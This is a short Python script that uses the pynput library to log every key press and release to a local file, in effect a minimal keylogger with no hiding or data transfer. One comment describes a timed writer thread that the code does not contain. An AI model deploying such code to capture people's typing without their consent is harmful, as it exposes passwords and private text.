from pynput import keyboard
import time

f = open("log2.txt", "a")

def main():
    # Spawning the thread to write to the log file every 5 seconds.
    with keyboard.Listener(on_press=recordPress, on_release=recordRelease) as listener:
        listener.join()


def recordPress(key):
    global f
    f.write(f"pressed {key}\n")
    f.flush()
def recordRelease(key):
    global f
    f.write(f"released {key}\n")
    f.flush()

if __name__=="__main__":
    main()